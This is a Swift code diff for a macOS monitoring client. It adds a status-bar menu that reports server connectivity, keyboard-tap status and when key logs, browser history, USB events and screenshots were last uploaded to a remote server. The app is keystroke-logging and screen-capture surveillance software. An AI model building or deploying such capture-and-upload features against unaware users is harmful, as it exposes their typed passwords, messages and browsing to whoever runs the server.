@@ -134,6 +134,11 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     var usbNotificationPort: IONotificationPortRef?
     var usbAddedIterator: io_iterator_t = 0
     var usbRemovedIterator: io_iterator_t = 0
+    
+    // Status bar menu components
+    var statusBarItem: NSStatusItem?
+    var statusMenu: NSMenu?
+    var statusUpdateTimer: Timer?
 
     // Add these properties at the top of the class
     private var lastEventTapCheck: Date = Date()
@@ -141,6 +146,16 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     private var isReestablishingEventTap: Bool = false
     var lastKeyCaptureTime: Date = Date()
     private let maxKeyCaptureGap: TimeInterval = 10.0 // Alert if no keys for 10 seconds
+    
+    // Last sent times for status tracking
+    private var lastKeyLogSent: Date?
+    private var lastBrowserHistorySent: Date?
+    private var lastUSBLogSent: Date?
+    private var lastScreenshotSent: Date?
+    private var lastTicSent: Date?
+    
+    // Server connectivity tracking
+    private var isServerConnected: Bool = false
 
     // Logging system
     let logFile = "MonitorClient.log"
@@ -363,6 +378,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         // Set up notification delegate
         NSUserNotificationCenter.default.delegate = self
+        
+        // Setup status bar menu
+        setupStatusBarMenu()
         
         logSuccess("MonitorClient initialization complete")
     }
@@ -1084,6 +1102,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         if (browserHistories.count > 0) {
             // Send data in chunks
             sendDataInChunks(data: browserHistories, eventType: "BrowserHistory", chunkSize: 1000)
+            lastBrowserHistorySent = Date()
         }
     }
 
@@ -1146,39 +1165,42 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             // Send request
             let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
                 DispatchQueue.main.async {
-                    if let error = error {
-                        self?.logError("Tic event network error: \(error)", context: "TicEvent")
-                        self?.logError("Error details: \(error.localizedDescription)", context: "TicEvent")
-                        return
-                    }
+                                    if let error = error {
+                    self?.logError("Tic event network error: \(error)", context: "TicEvent")
+                    self?.logError("Error details: \(error.localizedDescription)", context: "TicEvent")
+                    self?.isServerConnected = false
+                    return
+                }
                     
                     if let httpResponse = response as? HTTPURLResponse {
                         self?.logMessage("Tic event HTTP response: \(httpResponse.statusCode)", level: .debug)
                         self?.logMessage("Response headers: \(httpResponse.allHeaderFields)", level: .debug)
                         
-                        if httpResponse.statusCode != 200 {
-                            self?.logError("Tic event HTTP error: \(httpResponse.statusCode)", context: "TicEvent")
-                        }
-                    }
-                    
-                    if let data = data, let responseString = String(data: data, encoding: .utf8) {
-                        self?.logSuccess("Tic event sent successfully", details: "Response: \(responseString)")
-                        self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
-                        
-                        let jdata = self?.convertToDictionary(text: responseString)
-                        if jdata != nil && (jdata?["LastBrowserTic"]) != nil {
-                            let lastTic = jdata!["LastBrowserTic"] as! Double
+                        if httpResponse.statusCode == 200 {
+                            self?.logSuccess("Tic event sent successfully", details: "HTTP \(httpResponse.statusCode)")
+                            self?.isServerConnected = true
                             
-                            if lastBrowserTic == nil {
-                                lastBrowserTic = lastTic
-                                self?.logMessage("LastBrowserTic set to: \(lastTic)", level: .debug)
+                            if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                                self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
+                                self?.lastTicSent = Date()
+                                
+                                let jdata = self?.convertToDictionary(text: responseString)
+                                if jdata != nil && (jdata?["LastBrowserTic"]) != nil {
+                                    let lastTic = jdata!["LastBrowserTic"] as! Double
+                                    
+                                    if lastBrowserTic == nil {
+                                        lastBrowserTic = lastTic
+                                        self?.logMessage("LastBrowserTic set to: \(lastTic)", level: .debug)
+                                    }
+                                }
                             }
+                        } else {
+                            self?.logError("Tic event HTTP error: \(httpResponse.statusCode)", context: "TicEvent")
+                            self?.isServerConnected = false
                         }
                     } else {
-                        self?.logError("No response data received for tic event", context: "TicEvent")
-                        if let data = data {
-                            self?.logMessage("Raw response data: \(data)", level: .debug)
-                        }
+                        self?.logError("No HTTP response received for tic event", context: "TicEvent")
+                        self?.isServerConnected = false
                     }
                 }
             }
@@ -1208,6 +1230,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 // Send data in chunks
                 sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
                 self.keyLogs.removeAll()
+            lastKeyLogSent = Date()
                 logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
         } else {
             logMessage("No key logs to send", level: .debug)
@@ -1325,6 +1348,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 
                 if let data = data, let responseString = String(data: data, encoding: .utf8) {
                     self?.logSuccess("Screenshot uploaded successfully", details: "Response: \(responseString)")
+                    self?.lastScreenshotSent = Date()
                     
                     let jdata = self?.convertToDictionary(text: responseString)
                     if jdata != nil && (jdata?["Interval"]) != nil {
@@ -1563,6 +1587,12 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         timer?.invalidate()
         timer = nil
         
+        // Clean up status bar
+        statusUpdateTimer?.invalidate()
+        statusUpdateTimer = nil
+        statusBarItem = nil
+        statusMenu = nil
+        
         // Clean up notification observers
         NotificationCenter.default.removeObserver(self)
         NSWorkspace.shared.notificationCenter.removeObserver(self)
@@ -1760,6 +1790,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 // Send data in chunks
                 sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
                 self.usbDeviceLogs.removeAll()
+                lastUSBLogSent = Date()
                 logSuccess("USB logs sent and cleared", details: "\(usbDeviceLogs.count) events")
             } catch {
                 logError("Error converting USB logs to JSON: \(error)", context: "USBLog")
@@ -1881,7 +1912,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                     DispatchQueue.main.async {
                         if let error = error {
                             self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) network error: \(error)", context: eventType)
-                        self?.logError("Error details: \(error.localizedDescription)", context: eventType)
+                            self?.logError("Error details: \(error.localizedDescription)", context: eventType)
+                            self?.isServerConnected = false // Mark as disconnected on network error
                             return
                         }
                         
@@ -1891,17 +1923,19 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                         
                         if httpResponse.statusCode != 200 {
                             self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP error: \(httpResponse.statusCode)", context: eventType)
+                            self?.isServerConnected = false // Mark as disconnected on HTTP error
                         }
                         }
                         
                         if let data = data, let responseString = String(data: data, encoding: .utf8) {
                             self?.logSuccess("\(eventType) chunk \(index + 1)/\(chunks.count) sent successfully", details: "Response: \(responseString)")
-                        self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
+                            self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
+                            self?.isServerConnected = true // Mark as connected on successful API call
                         } else {
                             self?.logError("No response data received for \(eventType) chunk \(index + 1)/\(chunks.count)", context: eventType)
-                        if let data = data {
-                            self?.logMessage("Raw response data: \(data)", level: .debug)
-                        }
+                            if let data = data {
+                                self?.logMessage("Raw response data: \(data)", level: .debug)
+                            }
                         }
                     }
                 }
@@ -2194,18 +2228,28 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             DispatchQueue.main.async {
                 if let error = error {
                     self?.logError("Connectivity test failed: \(error)", context: "Connectivity")
+                    self?.isServerConnected = false
                     return
                 }
                 
                 if let httpResponse = response as? HTTPURLResponse {
-                    self?.logSuccess("Connectivity test successful", details: "HTTP \(httpResponse.statusCode)")
+                    if httpResponse.statusCode == 200 {
+                        self?.logSuccess("Connectivity test successful", details: "HTTP \(httpResponse.statusCode)")
+                        self?.isServerConnected = true
+                    } else {
+                        self?.logError("Connectivity test failed - HTTP \(httpResponse.statusCode)", context: "Connectivity")
+                        self?.isServerConnected = false
+                    }
                 } else {
                     self?.logError("Connectivity test failed - no HTTP response", context: "Connectivity")
+                    self?.isServerConnected = false
                 }
             }
         }
         task.resume()
     }
+    
+
     
     // MARK: - NSUserNotificationCenterDelegate
     
@@ -2440,6 +2484,202 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         task.resume()
         
         logMessage("=== End Server Test ===", level: .info)
+    }
+    
+    // MARK: - Status Bar Menu
+    
+    private func setupStatusBarMenu() {
+        // Create status bar item
+        statusBarItem = NSStatusBar.system.statusItem(withLength: NSStatusItem.variableLength)
+        
+        if let button = statusBarItem?.button {
+            button.title = "🗒️"
+            button.font = NSFont.systemFont(ofSize: 14)
+            
+            // Add click action for status bar icon
+            button.action = #selector(statusBarIconClicked)
+            button.target = self
+        }
+        
+        // Create menu
+        statusMenu = NSMenu()
+        statusMenu?.autoenablesItems = false
+        
+        // Add menu items
+        setupStatusMenuItems()
+        
+        // Set the menu
+        statusBarItem?.menu = statusMenu
+        
+        // Start status update timer
+        statusUpdateTimer = Timer.scheduledTimer(timeInterval: 2.0, target: self, selector: #selector(updateStatusMenu), userInfo: nil, repeats: true)
+        
+        logMessage("Status bar menu setup complete", level: .info)
+    }
+    
+    private func setupStatusMenuItems() {
+        guard let menu = statusMenu else { return }
+        
+        // Clear existing items
+        menu.removeAllItems()
+        
+        // App title
+        let titleItem = NSMenuItem(title: "MonitorClient v\(APP_VERSION)", action: nil, keyEquivalent: "")
+        titleItem.isEnabled = false
+        menu.addItem(titleItem)
+        
+        menu.addItem(NSMenuItem.separator())
+        
+        // Server status
+        let serverItem = NSMenuItem(title: "Server: Checking...", action: nil, keyEquivalent: "")
+        serverItem.tag = 100 // Tag for easy identification
+        serverItem.isEnabled = false
+        menu.addItem(serverItem)
+        
+        // Accessibility status
+        let accessibilityItem = NSMenuItem(title: "Accessibility: Checking...", action: nil, keyEquivalent: "")
+        accessibilityItem.tag = 101
+        accessibilityItem.isEnabled = false
+        menu.addItem(accessibilityItem)
+        
+        // Keyboard monitoring status
+        let keyboardItem = NSMenuItem(title: "Keyboard: Checking...", action: nil, keyEquivalent: "")
+        keyboardItem.tag = 102
+        keyboardItem.isEnabled = false
+        menu.addItem(keyboardItem)
+        
+        // Last sent times section
+        menu.addItem(NSMenuItem.separator())
+        
+        // Key logs last sent
+        let keyLogSentItem = NSMenuItem(title: "Key Logs: Never sent", action: nil, keyEquivalent: "")
+        keyLogSentItem.tag = 200
+        keyLogSentItem.isEnabled = false
+        menu.addItem(keyLogSentItem)
+        
+        // Browser history last sent
+        let browserHistorySentItem = NSMenuItem(title: "Browser History: Never sent", action: nil, keyEquivalent: "")
+        browserHistorySentItem.tag = 201
+        browserHistorySentItem.isEnabled = false
+        menu.addItem(browserHistorySentItem)
+        
+        // USB logs last sent
+        let usbLogSentItem = NSMenuItem(title: "USB Logs: Never sent", action: nil, keyEquivalent: "")
+        usbLogSentItem.tag = 202
+        usbLogSentItem.isEnabled = false
+        menu.addItem(usbLogSentItem)
+        
+        // Screenshots last sent
+        let screenshotSentItem = NSMenuItem(title: "Screenshots: Never sent", action: nil, keyEquivalent: "")
+        screenshotSentItem.tag = 203
+        screenshotSentItem.isEnabled = false
+        menu.addItem(screenshotSentItem)
+        
+        // Tic events last sent
+        let ticSentItem = NSMenuItem(title: "Tic Events: Never sent", action: nil, keyEquivalent: "")
+        ticSentItem.tag = 204
+        ticSentItem.isEnabled = false
+        menu.addItem(ticSentItem)
+        
+        menu.addItem(NSMenuItem.separator())
+        
+        // Manual test actions
+        let testKeyboardItem = NSMenuItem(title: "Test Keyboard Monitoring", action: #selector(testKeyboardMonitoring), keyEquivalent: "")
+        menu.addItem(testKeyboardItem)
+        
+        let testBrowserItem = NSMenuItem(title: "Test Browser History", action: #selector(testBrowserHistoryCollection), keyEquivalent: "")
+        menu.addItem(testBrowserItem)
+        
+        let testServerItem = NSMenuItem(title: "Test Server Connection", action: #selector(testServerConnectivity), keyEquivalent: "")
+        menu.addItem(testServerItem)
+        
+        menu.addItem(NSMenuItem.separator())
+        
+        // Settings
+        let openSettingsItem = NSMenuItem(title: "Open Accessibility Settings", action: #selector(openAccessibilityPreferences), keyEquivalent: "")
+        menu.addItem(openSettingsItem)
+        
+        menu.addItem(NSMenuItem.separator())
+        
+        // Quit
+        let quitItem = NSMenuItem(title: "Quit MonitorClient", action: #selector(quitApp), keyEquivalent: "q")
+        quitItem.keyEquivalentModifierMask = [.command]
+        menu.addItem(quitItem)
+    }
+    
+    @objc private func statusBarIconClicked() {
+        // Show a quick status notification
+        let notification = NSUserNotification()
+        notification.title = "MonitorClient Status"
+        
+        let serverIP = storage.string(forKey: "server-ip") ?? "Not configured"
+        let serverStatus: String
+        if serverIP == "Not configured" {
+            serverStatus = "Not configured"
+        } else {
+            serverStatus = isServerConnected ? "Connected" : "Disconnected"
+        }
+        
+        let isAccessibilityEnabled = isInputMonitoringEnabled()
+        let isKeyboardActive = eventTap != nil && CGEvent.tapIsEnabled(tap: eventTap!)
+        
+        notification.informativeText = """
+        Server: \(serverStatus)
+        Accessibility: \(isAccessibilityEnabled ? "✅" : "❌")
+        Keyboard: \(isKeyboardActive ? "✅" : "❌")
+        Keys: \(keyLogs.count)
+        USB Events: \(usbDeviceLogs.count)
+        """
+        
+        notification.soundName = nil // No sound for status clicks
+        NSUserNotificationCenter.default.deliver(notification)
+    }
+    
+    @objc private func updateStatusMenu() {
+        guard let menu = statusMenu else { return }
+        
+        // Update server status
+        if let serverItem = menu.item(withTag: 100) {
+            let serverIP = storage.string(forKey: "server-ip") ?? "Not configured"
+            if serverIP == "Not configured" {
+                serverItem.title = "Server: Not configured"
+            } else {
+                serverItem.title = "Server: \(isServerConnected ? "Connected" : "Disconnected")"
+            }
+        }
+        
+        // Update accessibility status
+        if let accessibilityItem = menu.item(withTag: 101) {
+            let isEnabled = isInputMonitoringEnabled()
+            accessibilityItem.title = "Accessibility: \(isEnabled ? "✅ Enabled" : "❌ Disabled")"
+        }
+        
+        // Update keyboard monitoring status
+        if let keyboardItem = menu.item(withTag: 102) {
+            let isEnabled = eventTap != nil && CGEvent.tapIsEnabled(tap: eventTap!)
+            let keyCount = keyLogs.count
+            keyboardItem.title = "Keyboard: \(isEnabled ? "✅ Active" : "❌ Inactive") (\(keyCount) keys)"
+        }
+        
+        // Update last sent times
+        updateLastSentTime(menu: menu, tag: 200, lastSent: lastKeyLogSent, type: "Key Logs")
+        updateLastSentTime(menu: menu, tag: 201, lastSent: lastBrowserHistorySent, type: "Browser History")
+        updateLastSentTime(menu: menu, tag: 202, lastSent: lastUSBLogSent, type: "USB Logs")
+        updateLastSentTime(menu: menu, tag: 203, lastSent: lastScreenshotSent, type: "Screenshots")
+        updateLastSentTime(menu: menu, tag: 204, lastSent: lastTicSent, type: "Tic Events")
+    }
+    
+    private func updateLastSentTime(menu: NSMenu, tag: Int, lastSent: Date?, type: String) {
+        if let item = menu.item(withTag: tag) {
+            if let lastSent = lastSent {
+                let formatter = DateFormatter()
+                formatter.dateFormat = "HH:mm:ss"
+                let timeString = formatter.string(from: lastSent)
+                item.title = "\(type): \(timeString)"
+            } else {
+                item.title = "\(type): Never sent"
+            }
+        }
     }
     
     // Quit the app (useful for background apps)
